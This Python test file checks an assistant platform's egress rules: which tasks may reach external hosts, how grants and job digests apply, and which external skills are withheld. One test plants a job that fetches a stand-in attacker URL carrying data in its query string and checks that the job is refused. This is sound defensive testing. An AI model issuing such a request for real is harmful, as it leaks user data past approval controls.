"""`Reach.egress_hosts`, `Reach.isolated_browser` and `external` withholding: the
decision every egress seam reads, in a table over source type, author, root and
job state."""

from __future__ import annotations

from pathlib import Path

import pytest

from istota import db
from istota.assignments.wakes import SOURCE_TYPE as ASSIGNMENT_SOURCE_TYPE
from istota.rooms import egress
from istota.rooms import scopes as room_scopes
from istota.skills._loader import load_skill_index
from istota.skills._types import SkillMeta

USER = "alice"
HOST = "news.example.com"
NO_OPERATOR_SKILLS = Path("/nonexistent-ops-skills-dir")
INDEX = {
    "calendar": SkillMeta(name="calendar", description="x", egress="local"),
    "browse": SkillMeta(name="browse", description="x", egress="external"),
    "devbox": SkillMeta(name="devbox", description="x", egress="external"),
}
ATTENDED = ["talk", "web", "email", "repl", "sms", "whatsapp", "cli"]
#: Unattended, with no subject to grant against: the empty set.
NO_SUBJECT = ["doctor", "heartbeat", "signup", "subtask", "playbook", ""]


@pytest.fixture
def conn(tmp_path):
    path = tmp_path / "istota.db"
    db.init_db(path)
    with db.get_db(path) as c:
        yield c


def _job(conn, name="digest", *, prompt="read the news", user_id=USER) -> int:
    return conn.execute(
        "INSERT INTO scheduled_jobs (user_id, name, cron_expression, prompt) "
        "VALUES (?, ?, '0 9 * * *', ?)",
        (user_id, name, prompt),
    ).lastrowid


def _task(conn, source_type, *, user_id=USER, **columns):
    if source_type == "email":
        columns.setdefault("conversation_token", None)
    task_id = db.create_task(
        conn, prompt="p", user_id=user_id, source_type=source_type, **columns,
    )
    if source_type == "email":
        # The user's own mail, read from the ledger as `turn_author` reads it.
        conn.execute(
            "INSERT INTO processed_emails (email_id, user_id, task_id, sender_email, "
            "routing_method) VALUES (?, ?, ?, ?, 'sender_match')",
            (f"m{task_id}", user_id, task_id, "alice@example.com"),
        )
    return db.get_task(conn, task_id)


def _grant(conn, subject, entry, *, skill_index=INDEX):
    egress.add_grant(conn, USER, subject, entry, decided_via="cli", skill_index=skill_index)


def _reach(conn, task, *, index=INDEX):
    return room_scopes.reach_for_task(
        conn, task, skill_index=index, own_addresses=["alice@example.com"],
    )


def _digest(conn, job_id) -> str:
    row = conn.execute("SELECT * FROM scheduled_jobs WHERE id = ?", (job_id,)).fetchone()
    return egress.job_digest(row)


class TestAttended:
    @pytest.mark.parametrize("source_type", ATTENDED)
    def test_an_own_attended_turn_has_open_egress(self, conn, source_type):
        reach = _reach(conn, _task(conn, source_type))
        assert reach.author == "own"
        assert reach.egress_hosts is None
        assert reach.isolated_browser is False
        assert reach.withheld == frozenset()

    def test_a_subtask_of_an_attended_task_takes_its_roots_answer(self, conn):
        root = _task(conn, "talk")
        child = _task(conn, "subtask", parent_task_id=root.id)
        reach = _reach(conn, child)
        assert reach.egress_hosts is None
        assert reach.isolated_browser is False

    def test_a_retry_copy_of_an_attended_task_takes_its_roots_answer(self, conn):
        root = _task(conn, "web")
        copy = _task(conn, "web", parent_task_id=root.id)
        assert _reach(conn, copy).egress_hosts is None


class TestOtherAuthors:
    def test_a_guests_turn_leaves_the_decision_to_web_tools_load(self, conn):
        reach = _reach(conn, _task(conn, "talk", guest_participant_id=7))
        assert reach.author == "guest"
        assert reach.egress_hosts is None
        assert reach.web_tools_load is False
        assert reach.isolated_browser is True

    def test_a_correspondents_turn_leaves_the_decision_to_web_tools_load(self, conn):
        task_id = db.create_task(conn, prompt="p", user_id=USER, source_type="email")
        conn.execute(
            "INSERT INTO processed_emails (email_id, user_id, task_id, sender_email, "
            "routing_method) VALUES ('c', ?, ?, 'mallory@elsewhere.example', 'plus_address')",
            (USER, task_id),
        )
        reach = _reach(conn, db.get_task(conn, task_id))
        assert reach.author == "correspondent"
        assert reach.egress_hosts is None
        assert reach.isolated_browser is True

    def test_research_holds_nothing_private_and_has_open_egress(self, conn):
        reach = _reach(conn, _task(conn, "group_briefing_research", user_id="__briefings__"))
        assert reach.egress_hosts is None
        assert reach.isolated_browser is True


class TestUnattended:
    @pytest.mark.parametrize("source_type", NO_SUBJECT)
    def test_no_subject_is_the_empty_set(self, conn, source_type):
        reach = _reach(conn, _task(conn, source_type))
        assert reach.egress_hosts == frozenset()
        assert reach.isolated_browser is True

    def test_a_scheduled_task_with_no_job_row_is_the_empty_set(self, conn):
        assert _reach(conn, _task(conn, "scheduled")).egress_hosts == frozenset()

    def test_tasks_md_is_not_attended_because_a_limited_task_can_write_it(self, conn):
        task = _task(conn, "istota_file")
        assert _reach(conn, task).egress_hosts == frozenset()
        _grant(conn, "tasks-file", HOST)
        assert _reach(conn, task).egress_hosts == {HOST}

    def test_a_new_job_runs_limited_with_nothing_approved(self, conn):
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        reach = _reach(conn, task)
        assert reach.egress_hosts == frozenset()
        assert reach.isolated_browser is True

    def test_a_jobs_hosts_are_its_own(self, conn):
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        _job(conn, "other")
        _grant(conn, "cron:other", "other.example.com")
        _grant(conn, "cron:digest", HOST)
        assert _reach(conn, task).egress_hosts == {HOST}

    def test_another_users_grant_on_the_same_name_is_not_read(self, conn):
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        egress.add_grant(conn, "bob", "cron:digest", HOST, decided_via="cli")
        assert _reach(conn, task).egress_hosts == frozenset()

    def test_a_job_row_of_another_user_is_not_this_users_job(self, conn):
        job_id = _job(conn, user_id="bob")
        egress.add_grant(conn, USER, "cron:digest", HOST, decided_via="cli")
        task = _task(conn, "scheduled", scheduled_job_id=job_id)
        assert _reach(conn, task).egress_hosts == frozenset()

    def test_a_personal_briefing(self, conn):
        conn.execute(
            "INSERT INTO briefing_configs (user_id, name, cron_expression, "
            "conversation_token, components, output) "
            "VALUES (?, 'morning', '0 9 * * *', '', '{}', 'email')",
            (USER,),
        )
        task = _task(conn, "briefing", briefing_name="morning")
        assert _reach(conn, task).egress_hosts == frozenset()
        _grant(conn, "briefing:morning", HOST)
        assert _reach(conn, task).egress_hosts == {HOST}

    def test_an_assignment_wake(self, conn):
        task = _task(conn, ASSIGNMENT_SOURCE_TYPE, assignment_id=12)
        assert _reach(conn, task).egress_hosts == frozenset()
        _grant(conn, "assignment:12", HOST)
        assert _reach(conn, task).egress_hosts == {HOST}

    def test_a_subtask_of_a_limited_job_has_the_roots_subject_and_hosts(self, conn):
        root = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        _grant(conn, "cron:digest", HOST)
        child = _task(conn, "subtask", parent_task_id=root.id)
        grandchild = _task(conn, "subtask", parent_task_id=child.id)
        assert _reach(conn, grandchild).egress_hosts == {HOST}
        assert _reach(conn, grandchild).isolated_browser is True

    def test_no_database_is_the_empty_set(self, make_task):
        reach = _reach(None, make_task(user_id=USER, source_type="talk"))
        assert reach.egress_hosts == frozenset()


class TestApprovedJobs:
    def test_an_approved_open_job_runs_as_it_does_today(self, conn):
        job_id = _job(conn)
        _grant(conn, "cron:digest", f"open:{_digest(conn, job_id)}")
        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=job_id))
        assert reach.egress_hosts is None
        assert reach.isolated_browser is False
        assert reach.withheld == frozenset()

    def test_a_subtask_of_an_open_job_takes_its_roots_answer(self, conn):
        job_id = _job(conn)
        _grant(conn, "cron:digest", f"open:{_digest(conn, job_id)}")
        root = _task(conn, "scheduled", scheduled_job_id=job_id)
        child = _task(conn, "subtask", parent_task_id=root.id)
        assert _reach(conn, child).egress_hosts is None

    def test_a_digest_mismatch_narrows_even_if_the_sync_has_not_run(self, conn):
        job_id = _job(conn)
        _grant(conn, "cron:digest", f"open:{_digest(conn, job_id)}")
        conn.execute("UPDATE scheduled_jobs SET prompt = 'send my notes' WHERE id = ?", (job_id,))
        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=job_id))
        assert reach.egress_hosts == frozenset()
        assert reach.isolated_browser is True

    def test_an_open_grant_for_another_job_does_not_apply(self, conn):
        first = _job(conn, "first", prompt="same text")
        second = _job(conn, "second", prompt="same text")
        _grant(conn, "cron:first", f"open:{_digest(conn, first)}")
        task = _task(conn, "scheduled", scheduled_job_id=second)
        assert _reach(conn, task).egress_hosts == frozenset()

    def test_a_public_request_with_an_approved_open_keeps_running_open(self, conn):
        job_id = _job(conn)
        conn.execute("UPDATE scheduled_jobs SET reach = 'public' WHERE id = ?", (job_id,))
        _grant(conn, "cron:digest", f"open:{_digest(conn, job_id)}")
        task = _task(conn, "scheduled", scheduled_job_id=job_id)
        assert _reach(conn, task).egress_hosts is None

    def test_a_planted_public_request_runs_limited(self, conn):
        job_id = _job(conn)
        conn.execute("UPDATE scheduled_jobs SET reach = 'public' WHERE id = ?", (job_id,))
        task = _task(conn, "scheduled", scheduled_job_id=job_id)
        assert _reach(conn, task).egress_hosts == frozenset()

    def test_an_approved_public_job_stays_limited_until_its_posture_exists(self, conn):
        """Stage 5 builds the withheld set that makes `public` hold nothing
        private. Until then open web on a job holding private data would be a
        widening, so the grant narrows."""
        job_id = _job(conn)
        _grant(conn, "cron:digest", f"public:{_digest(conn, job_id)}")
        task = _task(conn, "scheduled", scheduled_job_id=job_id)
        assert _reach(conn, task).egress_hosts == frozenset()


class TestReadFailures:
    def test_a_failed_read_narrows_and_warns(self, conn, caplog):
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        conn.execute("DROP TABLE egress_grants")
        with caplog.at_level("WARNING", logger="istota.rooms.scopes"):
            reach = _reach(conn, task)
        assert reach.egress_hosts == frozenset()
        assert reach.withheld == {"browse", "devbox"}
        assert f"egress_decide_failed task={task.id}" in caplog.text

    def test_a_broken_chain_does_not_reach_the_decision_as_own(self, conn):
        root = _task(conn, "talk")
        child = _task(conn, "subtask", parent_task_id=root.id)
        conn.execute("DELETE FROM tasks WHERE id = ?", (root.id,))
        reach = _reach(conn, child)
        assert reach.author == "correspondent"
        assert reach.egress_hosts is None
        assert reach.web_tools_load is False


class TestExternalWithholding:
    def test_a_limited_task_loses_each_external_skill(self, conn):
        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=_job(conn)))
        assert reach.withheld == {"browse", "devbox"}
        assert reach.egress_withheld == {"browse", "devbox"}

    def test_a_skill_grant_keeps_that_skill_and_no_other(self, conn):
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        _grant(conn, "cron:digest", "skill:browse")
        reach = _reach(conn, task)
        assert reach.withheld == {"devbox"}
        assert reach.isolated_browser is True

    def test_a_skill_with_no_egress_attribute_counts_as_external(self, conn):
        from types import SimpleNamespace

        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        reach = _reach(conn, task, index={"old": SimpleNamespace(shared_room="private")})
        assert reach.withheld == {"old"}

    def test_an_attended_task_withholds_nothing(self, conn):
        assert _reach(conn, _task(conn, "web")).withheld == frozenset()

    def test_the_shipped_index_withholds_what_the_spec_lists(self, conn):
        index = load_skill_index(NO_OPERATOR_SKILLS)
        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=_job(conn)), index=index)
        assert reach.egress_withheld == {
            "browse", "devbox", "relay", "wordpress", "google_workspace",
            "servarr", "nextcloud", "shares",
        }

    def test_an_empty_index_withholds_nothing_for_the_wallet_gate(self, conn):
        """`wallet.policy` reads the set's truth with an empty index, and a
        limited job still holds what the wallet asks about."""
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn))
        assert room_scopes.withheld_for_task(conn, task, skill_index={}) == frozenset()


class TestRestrictedIsNotLimited:
    """A limited job loses named skills. It is not a task whose input somebody
    else wrote, so the restricted posture does not follow."""

    def test_a_limited_task_is_not_restricted(self, conn):
        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=_job(conn)))
        assert reach.withheld
        assert reach.restricted is False

    def test_a_task_nobody_asked_in_a_shared_room_is_restricted(self, conn):
        room = db.create_web_chat_room(conn, USER, "Family")
        db.add_room_member(conn, room.token, "bob")
        reach = _reach(conn, _task(conn, "subtask", conversation_token=room.token))
        assert reach.restricted is True

    def test_a_guest_turn_is_restricted(self, conn):
        assert _reach(conn, _task(conn, "talk", guest_participant_id=7)).restricted is True

    def test_a_limited_job_keeps_the_per_user_temp_dir(self, conn, make_config):
        from istota.executor import task_temp_dir

        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=_job(conn)))
        config = make_config()
        task = _task(conn, "scheduled", scheduled_job_id=_job(conn, "other"))
        assert task_temp_dir(config, task, restricted=reach.restricted).name == USER


class TestTheSeamsReadingTheSet:
    def test_a_limited_task_keeps_its_vault_and_a_restricted_one_does_not(
        self, conn, tmp_path, make_task, make_config,
    ):
        from unittest.mock import patch

        from istota.sandbox import task_env

        config = make_config()
        config.security.skill_proxy_enabled = True
        task = make_task(id=9, user_id=USER, source_type="scheduled")
        inputs = dict(
            user_temp_dir=tmp_path, control_dir=tmp_path, task_attempt=1,
            selected_skills=[], skill_index=INDEX, is_admin=False, user_resources=[],
            user_config=None, withheld_scopes=frozenset({"browse"}),
        )
        with patch("istota.sandbox.task_env._vault_credentials", lambda *a: {"bank": "x"}):
            limited = task_env.build_task_runtime(config, task, restricted=False, **inputs)
            restricted = task_env.build_task_runtime(config, task, restricted=True, **inputs)
            unstated = task_env.build_task_runtime(config, task, **inputs)
        assert limited.proxy_ctx.vault_credentials == {"bank": "x"}
        assert restricted.proxy_ctx.vault_credentials == {}
        assert unstated.proxy_ctx.vault_credentials == {}

    def test_a_withheld_external_skill_leaves_the_menu_and_the_cli_list(self, conn, make_config):
        from istota.skills._loader import effective_disabled_skills

        reach = _reach(conn, _task(conn, "scheduled", scheduled_job_id=_job(conn)))
        disabled = effective_disabled_skills(
            make_config(), USER, INDEX, withheld_scopes=reach.withheld,
        )
        assert {"browse", "devbox"} <= disabled
        assert "calendar" not in disabled

    def test_the_room_card_does_not_blame_the_room_for_a_limited_job(
        self, conn, make_config,
    ):
        """A member's own job in their shared room: the job is limited, and the
        room withheld nothing."""
        from unittest.mock import patch

        from istota import executor

        room = db.create_web_chat_room(conn, USER, "Family")
        db.add_room_member(conn, room.token, "bob")
        task = _task(
            conn, "scheduled", scheduled_job_id=_job(conn), conversation_token=room.token,
        )
        reach = _reach(conn, task)
        assert reach.egress_withheld == {"browse", "devbox"} and not reach.restricted
        with patch.object(executor, "room_card", return_value="") as card:
            try:
                executor.build_prompt(
                    task, [], make_config(), conn=conn,
                    withheld_scopes=reach.withheld, reach=reach,
                )
            except Exception:  # noqa: BLE001 — only the card's argument is under test
                pass
        assert card.call_args.kwargs["withheld_scopes"] == frozenset()


class TestASkillJobWithNoProxy:
    """A `command = "istota-skill browse ..."` row is promoted to a skill task,
    which runs host-side with no proxy, so the proxy's gate does not reach it."""

    def _run(self, task, tmp_path, make_config):
        from istota.scheduler import _execute_skill_task

        config = make_config(db_path=tmp_path / "istota.db")
        return _execute_skill_task(task, config)

    def test_a_planted_external_skill_job_is_refused(self, conn, tmp_path, make_config):
        job_id = _job(conn)
        conn.commit()
        task = _task(conn, "scheduled", scheduled_job_id=job_id, skill="browse",
                     skill_args='["get", "https://evil.example/?d=x"]')
        conn.commit()
        ok, message = self._run(task, tmp_path, make_config)
        assert ok is False
        assert message.startswith("egress_not_approved")
        assert "evil.example" not in message

    def test_control_an_approved_job_gets_past_the_gate(self, conn, tmp_path, make_config):
        job_id = _job(conn)
        index = load_skill_index(NO_OPERATOR_SKILLS)
        _grant(conn, "cron:digest", "skill:browse", skill_index=index)
        conn.commit()
        task = _task(conn, "scheduled", scheduled_job_id=job_id, skill="browse",
                     skill_args='["--help"]')
        conn.commit()
        _ok, message = self._run(task, tmp_path, make_config)
        assert not message.startswith("egress_not_approved")
